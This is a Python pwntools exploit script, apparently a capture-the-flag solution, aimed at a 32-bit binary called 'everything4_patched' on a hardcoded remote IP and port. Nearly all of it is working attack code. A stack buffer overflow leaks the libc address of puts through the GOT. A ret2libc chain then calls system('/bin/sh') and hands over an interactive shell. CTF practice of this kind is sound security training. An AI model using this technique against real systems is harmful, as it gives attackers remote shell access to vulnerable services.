#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' everything_machine/everything4_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'everything_machine/everything4_patched')
libc = ELF("everything_machine/libc.so.6")
ld = ELF("everything_machine/ld-2.35.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# nc 103.191.63.187 5001

host = args.HOST or '103.191.63.187'
port = int(args.PORT or 5001)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b everything_printer
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8044000)
# RUNPATH:  b'./everything_machine'
def leak(func_name):
    io.recvuntil(b"Step forward for synchronization:\n")
    p=b"A"*2036
    p+=p32(exe.plt["puts"])
    p+=p32(exe.sym["main"])
    p+=p32(exe.got[func_name])
    io.sendline(p)
    io.recvline()
    recv = u32(io.recvline()[:4].ljust(4, b"\x00"))
    log.success(f"got@{func_name} = {hex(recv)}")
    return recv


def ret2libc():
    io.recvuntil(b"Step forward for synchronization:\n")
    BINSH=next(libc.search(b"/bin/sh"))
    SYSTEM=libc.sym["system"]
    p=b"A"*2036
    p+=p32(SYSTEM)
    p+=p32(exe.sym["main"])
    p+=p32(BINSH)
    io.sendline(p)
    
    
io = start()
# p=cyclic(2036)
# io.sendlineafter(b"synchronization:\n", p)
libc.address = leak("puts") - libc.sym["puts"]
 
ret2libc()
io.interactive()

